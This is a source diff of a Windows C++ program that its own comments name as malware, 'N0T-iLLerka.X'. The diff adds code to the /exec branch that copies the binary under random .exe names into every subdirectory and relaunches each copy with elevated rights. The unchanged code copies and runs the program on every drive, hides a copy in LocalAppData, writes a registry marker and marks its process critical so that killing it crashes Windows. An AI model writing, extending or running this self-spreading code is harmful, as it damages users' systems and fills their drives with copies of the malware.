@@ -27,156 +27,173 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine
 		ExitProcess(EXIT_FAILURE);
 	}
 
-	if (!lstrcmp(szArglist[1], L"/exec")) {
-// ######## Start of /exec ######## Malware Payload execution #######################################################################################
+	if (nArgs > 1) {
+		if (!lstrcmp(szArglist[1], L"/exec")) {
+			// ######## Start of /exec ######## Malware Payload execution #######################################################################################
 #ifdef DEBUG
-		MessageBox(NULL, L"Executing with Argument: /exec", L"N0T-iLLerka.X", MB_OK | MB_SYSTEMMODAL | MB_ICONINFORMATION);
+			MessageBox(NULL, L"Executing with Argument: /exec", L"N0T-iLLerka.X", MB_OK | MB_SYSTEMMODAL | MB_ICONINFORMATION);
 #endif
-		
-		// Check if /host Mutex exist, if not: Exit Malware
-		if (!CheckMutex(HOST_MUTEX)) {
+
+			// Check if /host Mutex exist, if not: Exit Malware
+			if (!CheckMutex(HOST_MUTEX)) {
+				if (szArglist) {
+					LocalFree(szArglist);
+				}
+				ExitProcess(EXIT_FAILURE);
+			}
+
+			wchar_t mfn[MAX_PATH];
+			GetModuleFileName(NULL, mfn, MAX_PATH);
+			wchar_t cd[MAX_PATH];
+			GetCurrentDirectory(MAX_PATH, cd);
+
+			std::vector<std::wstring> vwsDir, vwsFile;
+			if (DirectoryIeterator(cd, L"*", vwsDir, vwsFile)) {
+				std::wstring wsNf;
+				for (std::wstring x : vwsDir) {
+					wsNf = x + L"\\" + RandomStringGenerator(MIN_RSLEN + (RandomNumberGenerator() % ((MAX_RSLEN - MIN_RSLEN) + 1))) + L".exe";
+					CopyFile(mfn, wsNf.c_str(), FALSE);
+					ShellExecute(NULL, L"runas", wsNf.c_str(), L"/exec", x.c_str(), SW_SHOWDEFAULT);
+				}
+				for (std::wstring x : vwsFile) {
+
+				}
+			}
+
 			if (szArglist) {
 				LocalFree(szArglist);
 			}
-			ExitProcess(EXIT_FAILURE);
+			ExitProcess(EXIT_SUCCESS);
+			// ######## End of /exec ############################################################################################################################
 		}
-
-		wchar_t cd[MAX_PATH];
-		GetCurrentDirectory(MAX_PATH, cd);
-
-		std::vector<std::wstring> vwsDir, vwsFile;
-		if (DirectoryIeterator(cd, L"*", vwsDir, vwsFile)) {
-			for (std::wstring x : vwsDir) {
-
-			}
-			for (std::wstring x : vwsFile) {
-
-			}
-		}
-
-		if (szArglist) {
-			LocalFree(szArglist);
-		}
-		ExitProcess(EXIT_SUCCESS);
-// ######## End of /exec ############################################################################################################################
-	} else if (!lstrcmp(szArglist[1], L"/host")) {
-// ######## Start of /host ######## Malware Host with/without Malware initialization ################################################################
+		else if (!lstrcmp(szArglist[1], L"/host")) {
+			// ######## Start of /host ######## Malware Host with/without Malware initialization ################################################################
+				// /init: Initialize the Malware Host
 #ifdef DEBUG
-		if (!lstrcmp(szArglist[2], L"/init")) {
-			// /init: Initialize the Malware with Host
-			MessageBox(NULL, L"Executing with Argument: /init", L"N0T-iLLerka.X", MB_OK | MB_SYSTEMMODAL | MB_ICONINFORMATION);
-		} else {
-			// /init: Initialize the Malware Host
-			MessageBox(NULL, L"Executing with Argument: /host", L"N0T-iLLerka.X", MB_OK | MB_SYSTEMMODAL | MB_ICONINFORMATION);
-		}
+				MessageBox(NULL, L"Executing with Argument: /host", L"N0T-iLLerka.X", MB_OK | MB_SYSTEMMODAL | MB_ICONINFORMATION);
 #endif
 
-		if (!IsUserAdmin()) {
+			if (!IsUserAdmin()) {
 #ifdef DEBUG
-			MessageBox(NULL, L"Process isn't Administrator", L"N0T-iLLerka.X", MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);
-#endif
-			if (szArglist) {
-				LocalFree(szArglist);
-			}
-			ExitProcess(EXIT_FAILURE);
-		}
-
-		if (!SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS)) {
-#ifdef DEBUG
-			MessageBox(NULL, L"Couldn't set Malware Host to High Priority\nRunning with Normal Priority", L"SetPriorityClass", MB_OK | MB_SYSTEMMODAL | MB_ICONWARNING);
-#endif
-		}
-
-		// Get ModuleFileName
-		wchar_t mfn[MAX_PATH];
-		GetModuleFileName(NULL, mfn, MAX_PATH);
-
-		// Check if /host Mutex already exist, if exist: exit Malware, if not: { ... }
-		if (!CheckMutex(HOST_MUTEX)) {
-			// Create /host Mutex for /exec operation
-			HANDLE hMutex = CreateMutex(NULL, TRUE, HOST_MUTEX);
-			if (!hMutex) {
-#ifdef DEBUG
-				MessageBox(NULL, L"Couldn't create /host Mutex", L"N0T-iLLerka.X", MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);
+				MessageBox(NULL, L"Process isn't Administrator", L"N0T-iLLerka.X", MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);
 #endif
 				if (szArglist) {
 					LocalFree(szArglist);
 				}
 				ExitProcess(EXIT_FAILURE);
 			}
-		} else {
+
+			if (!SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS)) {
 #ifdef DEBUG
-			MessageBox(NULL, L"Malware Host is already running\n(Mutex already exist)", L"N0T-iLLerka.X", MB_OK | MB_SYSTEMMODAL | MB_ICONINFORMATION);
+				MessageBox(NULL, L"Couldn't set Malware Host to High Priority\nRunning with Normal Priority", L"SetPriorityClass", MB_OK | MB_SYSTEMMODAL | MB_ICONWARNING);
 #endif
-			if (szArglist) {
-				LocalFree(szArglist);
 			}
-			ExitProcess(EXIT_FAILURE);
-		}
 
-		// Create /host Semaphore for /exec operation
-		HANDLE hSemaphore = CreateSemaphore(NULL, MAX_SMPO, MAX_SMPO, HOST_SEMAPHORE);
-		if (!hSemaphore) {
+			// Get ModuleFileName
+			wchar_t mfn[MAX_PATH];
+			GetModuleFileName(NULL, mfn, MAX_PATH);
+
+			// Check if /host Mutex already exist, if exist: exit Malware, if not: { ... }
+			if (!CheckMutex(HOST_MUTEX)) {
+				// Create /host Mutex for /exec operation
+				HANDLE hMutex = CreateMutex(NULL, TRUE, HOST_MUTEX);
+				if (!hMutex) {
 #ifdef DEBUG
-			MessageBox(NULL, L"Couldn't create /host Semaphore", L"N0T-iLLerka.X", MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);
+					MessageBox(NULL, L"Couldn't create /host Mutex", L"N0T-iLLerka.X", MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);
 #endif
-			if (szArglist) {
-				LocalFree(szArglist);
+					if (szArglist) {
+						LocalFree(szArglist);
+					}
+					ExitProcess(EXIT_FAILURE);
+				}
 			}
-			ExitProcess(EXIT_FAILURE);
-		}
+			else {
+#ifdef DEBUG
+				MessageBox(NULL, L"Malware Host is already running\n(Mutex already exist)", L"N0T-iLLerka.X", MB_OK | MB_SYSTEMMODAL | MB_ICONINFORMATION);
+#endif
+				if (szArglist) {
+					LocalFree(szArglist);
+				}
+				ExitProcess(EXIT_FAILURE);
+			}
 
-		if (NTImportDLLFUNC()) {
-			NTSetProcessIsCritical();
-		}
+			// Create /host Semaphore for /exec operation
+			HANDLE hSemaphore = CreateSemaphore(NULL, MAX_SMPO, MAX_SMPO, HOST_SEMAPHORE);
+			if (!hSemaphore) {
+#ifdef DEBUG
+				MessageBox(NULL, L"Couldn't create /host Semaphore", L"N0T-iLLerka.X", MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);
+#endif
+				if (szArglist) {
+					LocalFree(szArglist);
+				}
+				ExitProcess(EXIT_FAILURE);
+			}
 
-		// Initialize the Malware
-		if (!lstrcmp(szArglist[2], L"/init")) {
-			// Enumerate Drives
-			std::vector<std::wstring> vwsDrives;
-		
-			if (DriveEnumerator(vwsDrives)) {
-				// Copy & Execute Malware in all enumerated Drives
-				for (std::wstring current_drive : vwsDrives) {
-					std::wstring wsNmfn = current_drive + RandomStringGenerator(MIN_RSLEN + (RandomNumberGenerator() % ((MAX_RSLEN - MIN_RSLEN) + 1))) + L".exe";
+			if (nArgs > 2) {
+				// Initialize the Malware
+				if (!lstrcmp(szArglist[2], L"/init")) {
+					// /init: Initialize the Malware with Host
+#ifdef DEBUG
+					MessageBox(NULL, L"Executing with Argument: /init", L"N0T-iLLerka.X", MB_OK | MB_SYSTEMMODAL | MB_ICONINFORMATION);
+#endif					
+					// Enumerate Drives
+					std::vector<std::wstring> vwsDrives;
 
-					if (CopyFile(mfn, wsNmfn.c_str(), FALSE)) {
-						ShellExecute(NULL, L"runas", wsNmfn.c_str(), L"/exec", current_drive.c_str(), SW_SHOWDEFAULT);
+					if (DriveEnumerator(vwsDrives)) {
+						// Copy & Execute Malware in all enumerated Drives
+						for (std::wstring current_drive : vwsDrives) {
+							std::wstring wsNmfn = current_drive + RandomStringGenerator(MIN_RSLEN + (RandomNumberGenerator() % ((MAX_RSLEN - MIN_RSLEN) + 1))) + L".exe";
+
+							if (CopyFile(mfn, wsNmfn.c_str(), FALSE)) {
+								ShellExecute(NULL, L"runas", wsNmfn.c_str(), L"/exec", current_drive.c_str(), SW_SHOWDEFAULT);
+							}
+							else {
+#ifdef DEBUG
+								MessageBox(NULL, L"Couldn't copy Binary to target Path", L"CopyFileW", MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);
+#endif
+							}
+						}
 					} else {
+						// If DriveEnumerator fails, try C:\ Directory
+						std::wstring wsNmfn = L"C:\\" + RandomStringGenerator(MIN_RSLEN + (RandomNumberGenerator() % ((MAX_RSLEN - MIN_RSLEN) + 1))) + L".exe";
+
+						if (CopyFile(mfn, wsNmfn.c_str(), FALSE)) {
+							ShellExecute(NULL, L"runas", wsNmfn.c_str(), L"/exec", L"C:\\", SW_SHOWDEFAULT);
+						}
+						else {
 #ifdef DEBUG
-						MessageBox(NULL, L"Couldn't copy Binary to target Path", L"CopyFileW", MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);
+							MessageBox(NULL, L"Couldn't copy Binary to target Path", L"CopyFileW", MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);
 #endif
+						}
+					}
+
+					// Create Registry Key
+					if (!CreateRegistryKey(L"SOFTWARE\\N0T-iLLerka.X", L"N0TiLLerka", REG_DWORD, 0xBADC0DE)) {
+						// TODO: add nothing at all because I don't know what I should do here.
+						//		 If the functions fails well then it will fail.
+						//		 This function is only included because it is used to prevent the Malware to install itself multiple times,
+						//		 if the User manually executes the Malware after the initial Initialization
 					}
 				}
-			} else {
-				// If DriveEnumerator fails, try C:\ Directory
-				std::wstring wsNmfn = L"C:\\" + RandomStringGenerator(MIN_RSLEN + (RandomNumberGenerator() % ((MAX_RSLEN - MIN_RSLEN) + 1))) + L".exe";
+			}
 
-				if (CopyFile(mfn, wsNmfn.c_str(), FALSE)) {
-					ShellExecute(NULL, L"runas", wsNmfn.c_str(), L"/exec", L"C:\\", SW_SHOWDEFAULT);
-				} else {
+			if (NTImportDLLFUNC()) {
+				if (NTSetProcessIsCritical(TRUE)) {
 #ifdef DEBUG
-					MessageBox(NULL, L"Couldn't copy Binary to target Path", L"CopyFileW", MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);
+					MessageBox(NULL, L"HostProcess is now Critical", L"N0T-iLLerka.X", MB_OK | MB_SYSTEMMODAL | MB_ICONWARNING);
 #endif
 				}
 			}
 
-			// Create Registry Key
-			if (!CreateRegistryKey(L"SOFTWARE\\N0T-iLLerka.X", L"N0TiLLerka", REG_DWORD, 0xBADC0DE)) {
-				// TODO: add nothing at all because I don't know what I should do here.
-				//		 If the functions fails well then it will fail.
-				//		 This function is only included because it is used to prevent the Malware to install itself multiple times,
-				//		 if the User manually executes the Malware after the initial Initialization
-			}
-		}
 
-		if (szArglist) {
-			LocalFree(szArglist);
+			if (szArglist) {
+				LocalFree(szArglist);
+			}
+			for (;;) {
+				Sleep(INFINITE);
+			}
+			// ######## End of /host ############################################################################################################################
 		}
-		for (;;) {
-			Sleep(INFINITE);
-		}
-// ######## End of /host ############################################################################################################################
 	}
 
 	// If no Argument was passed ...
@@ -188,7 +205,7 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine
 	// Create Random String to Copy host into AppData if necessary
 	PWSTR pwShkfp;
 	SHGetKnownFolderPath(FOLDERID_LocalAppData, 0, NULL, &pwShkfp);
-	std::wstring wsAdpn = std::wstring(pwShkfp) + RandomStringGenerator(MIN_RSLEN + (RandomNumberGenerator() % ((MAX_RSLEN - MIN_RSLEN) + 1)));
+	std::wstring wsAdpn = std::wstring(pwShkfp) + L"\\" + RandomStringGenerator(MIN_RSLEN + (RandomNumberGenerator() % ((MAX_RSLEN - MIN_RSLEN) + 1)));
 	std::wstring wsAdfn = wsAdpn + L"\\" + RandomStringGenerator(16) + L".exe";
 	CoTaskMemFree(pwShkfp);
 
@@ -242,7 +259,7 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine
 			L"DO YOU WANT TO EXECUTE THIS MALWARE ?", L"N0T-iLLerka.X", MB_YESNO | MB_SYSTEMMODAL | MB_ICONWARNING) == IDYES) {
 #endif
 			if (CopyFileAppData(wsAdpn.c_str(), wsAdfn.c_str(), mfn)) {
-				ShellExecute(NULL, L"runas", wsAdfn.c_str(), L"/host /init", NULL, SW_SHOWDEFAULT);
+				ShellExecute(NULL, L"runas", wsAdfn.c_str(), L"/host /init", wsAdpn.c_str(), SW_SHOWDEFAULT);
 			} else {
 				if (szArglist) {
 					LocalFree(szArglist);
